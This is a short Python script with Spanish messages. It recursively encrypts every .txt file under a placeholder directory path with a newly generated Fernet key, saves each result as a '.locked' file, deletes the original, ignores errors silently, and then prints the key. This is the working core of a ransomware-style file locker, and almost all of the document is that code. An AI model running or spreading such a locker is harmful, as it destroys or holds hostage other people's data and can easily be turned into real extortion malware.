import os
from cryptography.fernet import Fernet

key = Fernet.generate_key()
cipher = Fernet(key)

for root, _, files in os.walk("#RUTA DONDE SE ENCUENTRAN LOS ARCHIVOS A CIFRAR"):
    for file in files:
       if file.endswith(".txt"):
            file_path = os.path.join(root, file)
        
            try:
                with open(file_path, 'rb') as f:
                    data = f.read()

                encrypted = cipher.encrypt(data)

                with open(file_path + '.locked', 'wb') as f:
                    f.write(encrypted)

                os.remove(file_path)
            except:
                pass
 
print(f"\n[!] Todos los archivos .txt han sido cifrados.")
print(f"\n[+] Key: {key.decode()}")
